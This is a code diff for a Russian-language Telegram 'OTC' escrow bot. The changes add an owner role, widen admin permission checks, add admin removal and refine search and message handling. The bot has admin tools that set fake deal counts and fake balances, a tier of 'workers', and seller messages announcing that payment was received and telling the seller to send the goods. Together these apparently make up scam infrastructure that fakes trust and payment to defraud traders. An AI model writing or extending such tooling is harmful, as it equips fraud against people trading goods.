-            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+        # Добавление админа (только для владельцев)
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён. Только владельцы могут добавлять администраторов", show_alert=True)
             return
         
         users[user_id]['awaiting_admin_id'] = True
@@ -2241,7 +2558,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, admin_add_text, keyboard)
     
     elif call.data == 'fake_deals':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2264,7 +2581,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, fake_deals_text, keyboard)
     
     elif call.data == 'fake_balance':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2329,6 +2646,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         send_photo_message(chat_id, message_id, buyer_text, keyboard)
         
+        # ИСПРАВЛЕНО: "тех поддержке" вместо "тех поддержки"
         seller_text = f"""
 💰 <b>ПОЛУЧЕНА ОПЛАТА!</b>
 
@@ -2364,7 +2682,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Покупатель:</b> @{users[deal['buyer_id']]['username']}
 
 <b>Ожидайте подтверждения получения от тех поддержки.</b>
-<i>Если покупатель не подтвердит получение в течение 24 часов, средства будут автоматически переведены вам.</i>
+<i>Если тех поддержка не подтвердит получение в течение 24 часов, средства будут автоматически переведены вам.</i>
         """
         keyboard = InlineKeyboardMarkup(row_width=1)
         keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
@@ -2492,9 +2810,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 👤 <b>Покупатель:</b> @{users[user_id]['username']}
 💸 <b>Сумма:</b> {deal['amount']} {deal['currency']}
 
-<b>Покупатель подтвердил оплату. 
-Передайте товар сделки только поддержке!
-В случае передачи 3-ему лицу мы не несем ответственность за него.</b>
+<b>Покупатель подтвердил оплату. Отправьте товар!</b>
         """
         seller_keyboard = InlineKeyboardMarkup(row_width=2)
         seller_keyboard.add(
@@ -2553,14 +2869,14 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     
     # Новые функции админа: просмотр всех сделок
     elif call.data == 'all_deals_admin':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
         show_all_deals_admin(user_id, chat_id, message_id)
     
     elif call.data.startswith('all_deals_admin_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2568,7 +2884,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         show_all_deals_admin(user_id, chat_id, message_id, page)
     
     elif call.data.startswith('admin_view_deal_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2577,7 +2893,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     
     # Просмотр действий в сделке
     elif call.data == 'deal_activities_admin':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2592,7 +2908,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, activities_text, deal_activities_menu_keyboard())
     
     elif call.data.startswith('deal_activities_menu_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2607,7 +2923,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, activities_text, deal_activities_menu_keyboard(page))
     
     elif call.data.startswith('admin_deal_activity_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2618,7 +2934,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     
     # Просмотр действий пользователя
     elif call.data == 'user_activities_admin':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2633,7 +2949,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, activities_text, user_activities_menu_keyboard())
     
     elif call.data.startswith('user_activities_menu_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2648,7 +2964,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, activities_text, user_activities_menu_keyboard(page))
     
     elif call.data.startswith('admin_user_activity_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2658,7 +2974,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         show_user_activities_admin(user_id, chat_id, message_id, target_user_id, page)
     
     elif call.data.startswith('admin_view_user_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2668,7 +2984,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     
     # Меню рассылок
     elif call.data == 'broadcast_menu':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2687,7 +3003,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, broadcast_text, broadcast_menu_keyboard())
     
     elif call.data.startswith('broadcast_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2731,7 +3047,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, broadcast_instruction, keyboard)
     
     elif call.data == 'private_message_menu':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2748,7 +3064,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, private_message_text, private_message_menu_keyboard())
     
     elif call.data == 'private_message':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2775,7 +3091,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, private_message_instruction, keyboard)
     
     elif call.data == 'private_message_list':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2785,7 +3101,8 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 <b>Выберите пользователя для отправки сообщения:</b>
 • 👤 — обычный пользователь
 • 👷 — воркер
-• 👑 — администратор
+• ⚙️ — администратор
+• 👑 — владелец
 
 <b>Нажмите на пользователя, чтобы выбрать его в качестве получателя.</b>
         """
@@ -2793,7 +3110,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, recipients_text, private_message_recipients_keyboard())
     
     elif call.data.startswith('private_message_list_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2808,7 +3125,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, recipients_text, private_message_recipients_keyboard(page))
     
     elif call.data.startswith('select_recipient_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2837,7 +3154,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, recipient_text, keyboard)
     
     elif call.data.startswith('admin_message_user_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2867,7 +3184,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     
     # Обработчики поиска
     elif call.data == 'search_deal_admin':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2888,7 +3205,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, search_text, keyboard)
     
     elif call.data in ['search_deal_activity_admin', 'search_user_activity_admin', 'search_recipient_admin']:
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2926,18 +3243,27 @@ https://t.me/{bot.get_me().username}?start={deal_id}
     elif call.data == 'noop':
         # Пустое действие, используется для кнопок-заглушек
         bot.answer_callback_query(call.id)
+    
+    else:
+        # Если callback не распознан, показываем главное меню
+        send_photo_message(chat_id, message_id, get_welcome_text(), main_menu(user_id))
 
 # Обработчик текстовых сообщений
 @bot.message_handler(content_types=['text', 'photo', 'document'])
 def handle_message(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
+    
+    # Игнорируем сообщения не от пользователя (например, из групп)
+    if message.chat.type != 'private':
+        return
+    
     init_user(user_id)
     update_user_activity(user_id)
     user = users[user_id]
     
-    # Проверяем, является ли пользователь администратором и ожидает ли он действий
-    if user_id in admins:
+    # Проверяем, является ли пользователь администратором/владельцем и ожидает ли он действий
+    if user_id in admins or user_id in owners:
         # Обработка поиска сделки
         if user.get('awaiting_search_deal'):
             search_query = message.text.strip()
@@ -3034,13 +3360,22 @@ def handle_message(message):
             search_query = message.text.strip().lower()
             users[user_id][f'awaiting_search_{search_type}'] = False
             
-            # Поиск пользователей
-            found_users = []
-            for uid, user_data in users.items():
-                if (search_query in str(uid) or 
-                    search_query in user_data['username'].lower() or
-                    search_query in f"@{user_data['username'].lower()}"):
-                    found_users.append(uid)
+            # ИСПРАВЛЕНО: бот теперь воспринимает только числа как ID, а не любой текст
+            # Проверяем, является ли запрос числом (ID)
+            if search_query.isdigit():
+                # Поиск по ID
+                user_id_to_find = int(search_query)
+                if user_id_to_find in users:
+                    found_users = [user_id_to_find]
+                else:
+                    found_users = []
+            else:
+                # Поиск по username
+                found_users = []
+                for uid, user_data in users.items():
+                    if (search_query in user_data['username'].lower() or
+                        search_query in f"@{user_data['username'].lower()}"):
+                        found_users.append(uid)
             
             if not found_users:
                 bot.send_message(chat_id, f"❌ <b>ПОЛЬЗОВАТЕЛИ НЕ НАЙДЕНЫ</b>\n\nПо запросу '{search_query}' не найдено пользователей.", parse_mode='HTML')
@@ -3087,7 +3422,7 @@ def handle_message(message):
                 
                 for i, uid in enumerate(found_users[:10], 1):
                     user_data = users[uid]
-                    role_icon = "👑" if uid in admins else "👷" if uid in workers else "👤"
+                    role_icon = "👑" if uid in owners else "⚙️" if uid in admins else "👷" if uid in workers else "👤"
                     activity_count = len(user_activities.get(uid, [])) if search_type == 'user_activity' else 0
                     
                     users_text += f"{i}. {role_icon} <b>@{user_data['username']}</b>\n"
@@ -3242,6 +3577,11 @@ def handle_message(message):
                 parts = message.text.strip().split(' ', 1)
                 if len(parts) < 2:
                     bot.send_message(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ</b>\n\nИспользуйте: <code>ID_пользователя Ваше сообщение</code>", parse_mode='HTML')
+                    return
+                
+                # Проверяем, является ли первый элемент числом (ID)
+                if not parts[0].isdigit():
+                    bot.send_message(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ ID</b>\n\nID пользователя должен быть числом", parse_mode='HTML')
                     return
                 
                 try:
@@ -3506,8 +3846,8 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, None, deal_text, keyboard)
         return
     
-    # Обработка команд администратора
-    if user_id in admins:
+    # Обработка команд администратора/владельца
+    if user_id in admins or user_id in owners:
         if user.get('awaiting_admin_id'):
             try:
                 new_admin_id = int(message.text)
@@ -3526,7 +3866,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Пользователь получил права администратора.</b>
                 """
-                send_photo_message(chat_id, None, admin_granted_text, admin_panel_menu())
+                send_photo_message(chat_id, None, admin_granted_text, admin_panel_menu(user_id))
                 user['awaiting_admin_id'] = False
                 return
             except ValueError:
@@ -3579,7 +3919,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 <b>Пользователь получил права воркера.</b>
 <i>Уведомление отправлено новому воркеру.</i>
                 """
-                send_photo_message(chat_id, None, worker_granted_text, admin_panel_menu())
+                send_photo_message(chat_id, None, worker_granted_text, admin_panel_menu(user_id))
                 user['awaiting_worker_id'] = False
                 return
             except ValueError:
@@ -3588,18 +3928,59 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         elif user.get('awaiting_remove_worker'):
             try:
-                worker_id = int(message.text)
-                if worker_id in workers:
-                    workers.remove(worker_id)
+                target_id = int(message.text)
+                
+                # Проверяем, является ли это ID админа (только для владельцев)
+                if target_id in admins and user_id in owners:
+                    # Это удаление админа
+                    if target_id in owners:
+                        bot.send_message(chat_id, "❌ <b>НЕЛЬЗЯ УДАЛИТЬ ВЛАДЕЛЬЦА</b>", parse_mode='HTML')
+                        user['awaiting_remove_worker'] = False
+                        return
+                    
+                    admins.remove(target_id)
+                    save_data()
+                    
+                    # Логируем удаление администратора
+                    log_activity(user_id, f'Удалил администратора ID:{target_id}')
+                    
+                    if target_id in users:
+                        admin_name = users[target_id]['username']
+                        notification_text = f"""
+⚙️ <b>ВЫ БЫЛИ ЛИШЕНЫ СТАТУСА АДМИНИСТРАТОРА</b>
+
+Ваш статус администратора был отозван владельцем.
+Теперь вы являетесь обычным пользователем.
+
+Если это ошибка, свяжитесь с владельцем.
+                        """
+                        try:
+                            bot.send_message(target_id, notification_text, parse_mode='HTML')
+                        except:
+                            pass
+                    
+                    result_text = f"""
+🗑️ <b>АДМИНИСТРАТОР УДАЛЁН</b>
+
+<b>Администратор:</b> @{admin_name if target_id in users else target_id}
+<b>ID:</b> <code>{target_id}</code>
+<b>Удалил:</b> @{user['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Статус администратора успешно отозван.</b>
+                    """
+                elif target_id in workers:
+                    # Это удаление воркера
+                    workers.remove(target_id)
                     save_data()
                     
                     # Логируем удаление воркера
-                    log_activity(user_id, f'Удалил воркера ID:{worker_id}')
+                    log_activity(user_id, f'Удалил воркера ID:{target_id}')
                     
-                    if worker_id in users:
-                        worker_name = users[worker_id]['username']
+                    if target_id in users:
+                        worker_name = users[target_id]['username']
                         notification_text = f"""
-📉 <b>ВЫ БЫЛИ ПОНИЖЕНЫ</b>
+❌ <b>ВЫ БЫЛИ ЛИШЕНЫ СТАТУСА ВОРКЕРА</b>
 
 Ваш статус воркера был отозван администратором.
 Теперь вы являетесь обычным пользователем.
@@ -3607,23 +3988,26 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 Если это ошибка, свяжитесь с поддержкой.
                         """
                         try:
-                            bot.send_message(worker_id, notification_text, parse_mode='HTML')
+                            bot.send_message(target_id, notification_text, parse_mode='HTML')
                         except:
                             pass
                     
                     result_text = f"""
-📉 <b>ВОРКЕР ПОНИЖЕН</b>
+✅ <b>ВОРКЕР УДАЛЁН</b>
 
-<b>Воркер:</b> @{worker_name if worker_id in users else worker_id}
-<b>ID:</b> <code>{worker_id}</code>
-<b>Понизил:</b> @{user['username']}
+<b>Воркер:</b> @{worker_name if target_id in users else target_id}
+<b>ID:</b> <code>{target_id}</code>
+<b>Удалил:</b> @{user['username']}
 <b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
 
-<b>Статус воркера успешно понижен до обычного пользователя.</b>
+<b>Статус воркера успешно отозван.</b>
                     """
-                    send_photo_message(chat_id, None, result_text, admin_panel_menu())
                 else:
-                    bot.send_message(chat_id, f"❌ <b>ПОЛЬЗОВАТЕЛЬ {worker_id} НЕ ЯВЛЯЕТСЯ ВОРКЕРОМ</b>", parse_mode='HTML')
+                    bot.send_message(chat_id, f"❌ <b>ПОЛЬЗОВАТЕЛЬ {target_id} НЕ ЯВЛЯЕТСЯ ВОРКЕРОМ ИЛИ АДМИНИСТРАТОРОМ</b>", parse_mode='HTML')
+                    user['awaiting_remove_worker'] = False
+                    return
+                
+                send_photo_message(chat_id, None, result_text, admin_panel_menu(user_id))
                 user['awaiting_remove_worker'] = False
                 return
             except ValueError:
@@ -3636,22 +4020,35 @@ https://t.me/{bot.get_me().username}?start={deal_id}
                 user_data = users.get(worker_id)
                 if user_data:
                     check_text = f"""
-🔍 <b>ПРОВЕРКА ВОРКЕРА</b>
+🔍 <b>ПРОВЕРКА ПОЛЬЗОВАТЕЛЯ</b>
 
-<b>Воркер:</b> @{user_data['username']}
+<b>Пользователь:</b> @{user_data['username']}
 <b>ID:</b> <code>{worker_id}</code>
+<b>Роль:</b> {"👑 Владелец" if worker_id in owners else "⚙️ Админ" if worker_id in admins else "👷 Воркер" if worker_id in workers else "👤 Пользователь"}
 <b>Сделок:</b> {user_data['success_deals']}
 <b>Рейтинг:</b> {user_data['rating']}⭐
 <b>Дата регистрации:</b> {user_data['join_date']}
 
 <b>Статус:</b> ✅ Активен
                     """
-                    keyboard = InlineKeyboardMarkup(row_width=2)
-                    keyboard.add(
-                        InlineKeyboardButton("🗑️ Удалить воркера", callback_data=f'remove_worker_confirm_{worker_id}'),
-                        InlineKeyboardButton("📉 Понизить", callback_data=f'demote_worker_confirm_{worker_id}')
-                    )
-                    keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='show_workers'))
+                    
+                    if worker_id in workers:
+                        keyboard = InlineKeyboardMarkup(row_width=2)
+                        keyboard.add(
+                            InlineKeyboardButton("🗑️ Удалить воркера", callback_data=f'remove_worker_confirm_{worker_id}'),
+                            InlineKeyboardButton("📉 Понизить", callback_data=f'demote_worker_confirm_{worker_id}')
+                        )
+                        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='show_workers'))
+                    elif worker_id in admins and user_id in owners and worker_id not in owners:
+                        keyboard = InlineKeyboardMarkup(row_width=2)
+                        keyboard.add(
+                            InlineKeyboardButton("🗑️ Удалить админа", callback_data=f'remove_admin_confirm_{worker_id}'),
+                            InlineKeyboardButton("👤 Профиль", callback_data=f'admin_view_user_{worker_id}')
+                        )
+                        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='show_admins'))
+                    else:
+                        keyboard = InlineKeyboardMarkup(row_width=1)
+                        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data='show_workers' if worker_id in workers else 'show_admins' if worker_id in admins else 'admin_panel'))
                     
                     send_photo_message(chat_id, None, check_text, keyboard)
                 else:
@@ -3689,7 +4086,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Статистика пользователя обновлена.</b>
                 """
-                send_photo_message(chat_id, None, fake_deals_done_text, admin_panel_menu())
+                send_photo_message(chat_id, None, fake_deals_done_text, admin_panel_menu(user_id))
                 user['awaiting_fake_deals'] = False
                 return
             except:
@@ -3736,7 +4133,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Баланс пользователя обновлён.</b>
                 """
-                send_photo_message(chat_id, None, fake_balance_done_text, admin_panel_menu())
+                send_photo_message(chat_id, None, fake_balance_done_text, admin_panel_menu(user_id))
                 user['awaiting_fake_balance'] = False
                 return
             except Exception as e:
@@ -3816,7 +4213,31 @@ https://t.me/{bot.get_me().username}?start={deal_id}
                 return
     
     # Если не обработано другими обработчиками, показываем главное меню
-    send_photo_message(chat_id, None, get_welcome_text(), main_menu(user_id))
+    # ИСПРАВЛЕНО: Теперь главное меню показывается только при команде /start
+    # Для обычных текстовых сообщений ничего не делаем
+    if not message.text.startswith('/'):
+        # Если это не команда, но пользователь не находится в состоянии ожидания,
+        # просто игнорируем сообщение или показываем подсказку
+        if not any([
+            user.get('awaiting_ton_wallet'),
+            user.get('awaiting_card_details'),
+            user.get('awaiting_phone'),
+            user.get('awaiting_usdt'),
+            user.get('awaiting_deal_amount'),
+            user.get('awaiting_deal_category'),
+            user.get('awaiting_admin_id'),
+            user.get('awaiting_worker_id'),
+            user.get('awaiting_fake_deals'),
+            user.get('awaiting_fake_balance'),
+            user.get('awaiting_remove_worker'),
+            user.get('awaiting_check_deals'),
+            user.get('awaiting_search_deal'),
+            user.get('awaiting_search_deal_activity'),
+            user.get('awaiting_search_user_activity'),
+            user.get('awaiting_search_recipient')
+        ]):
+            # Показываем подсказку о команде /start
+            bot.send_message(chat_id, "ℹ️ Используйте команду /start для начала работы с ботом", parse_mode='HTML')
 
 # Запуск бота
 if __name__ == '__main__':
@@ -3825,11 +4246,12 @@ if __name__ == '__main__':
     print("🤖 БОТ PLAYEROK OTC ЗАПУЩЕН...")
     print(f"📊 ПОЛЬЗОВАТЕЛЕЙ: {len(users)}")
     print(f"📋 СДЕЛОК: {len(deals)}")
-    print(f"👑 АДМИНОВ: {len(admins)}")
+    print(f"👑 ВЛАДЕЛЬЦЫ: {len(owners)} | АДМИНЫ: {len(admins) - len(owners)}")
     print(f"👷 ВОРКЕРОВ: {len(workers)}")
     print(f"📊 АКТИВНОСТЕЙ: {sum(len(v) for v in user_activities.values())} пользовательских, {sum(len(v) for v in deal_activities.values())} сделочных")
     print(f"📸 ФОТО ДОСТУПНО: {'✅' if PHOTO_AVAILABLE else '❌'}")
     print(f"📁 ТЕКУЩАЯ ПАПКА: {BASE_DIR}")
+    print(f"📝 ГРУППА ДЛЯ ЛОГОВ: {LOG_GROUP_ID}")
     print("✅ БОТ ГОТОВ К РАБОТЕ!")
     
     # Счетчик попыток
@@ -3915,4 +4337,3 @@ if __name__ == '__main__':
     print("💾 Сохранение данных...")
     save_data()
     print("👋 Бот завершил работу")
-
